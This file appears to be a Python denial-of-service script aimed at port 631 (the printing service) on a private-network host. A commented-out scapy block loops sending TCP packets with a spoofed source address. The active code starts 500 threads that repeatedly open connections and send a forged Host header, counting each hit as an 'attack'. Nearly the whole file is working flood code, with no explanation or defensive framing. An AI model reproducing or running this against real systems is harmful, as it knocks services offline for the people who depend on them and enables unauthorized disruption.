'''from scapy.layers.inet import IP,TCP
from scapy import all
source_IP = "192.168.1.101"
target_IP = "192.168.29.80"
source_port =80
i = 1

while True:
 IP1=IP(src=source_IP, dst=target_IP)
 TCP1 = TCP(sport=source_port, dport=631)
 pkt = IP1 / TCP1
 all.send(pkt, inter= .001)

 print("packet sent ", i)
 i = i + 1

'''
import socket
import threading

target = '192.168.29.80'
fake_ip = '192.168.1.101'
port = 631
attack_num = 0
def attack():
 while True:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))
  #s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
  s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

  global attack_num
  attack_num += 1
  print(attack_num)

  s.close()
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()



